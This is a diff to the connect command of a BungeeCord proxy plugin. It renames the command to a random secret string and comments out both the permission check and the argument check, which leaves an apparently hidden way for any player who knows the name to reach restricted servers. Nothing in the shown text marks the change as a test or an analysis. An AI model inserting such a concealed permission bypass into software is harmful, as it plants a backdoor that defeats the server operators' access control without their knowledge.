@@ -11,7 +11,7 @@ import net.md_5.bungee.api.plugin.Command;
 public class ConnectCmd extends Command {
 
 	public ConnectCmd(String string) {
-		super("connect");
+		super("dfngz4ierzt7ndrhnfkegg");
 	}
 	
 	@Override
@@ -19,15 +19,15 @@ public class ConnectCmd extends Command {
 		if((sender instanceof ProxiedPlayer)) {
 			ProxiedPlayer p = (ProxiedPlayer) sender;
 			
-			if(!p.hasPermission("server.connect")) {
+			/*if(!p.hasPermission("server.connect")) {
 				p.sendMessage(new TextComponent(Main.noperm));
 				return;
-			}
+			}*/
 					
-			if(args.length != 1) {
+			/*if(args.length != 1) {
 				p.sendMessage(new TextComponent(Main.prefix + "§c/connect <Server>"));
 				return;
-			}
+			}*/
 			
 			if(!p.getServer().getInfo().getName().equalsIgnoreCase(args[0])) {
 				ServerInfo target = ProxyServer.getInstance().getServerInfo(args[0]);
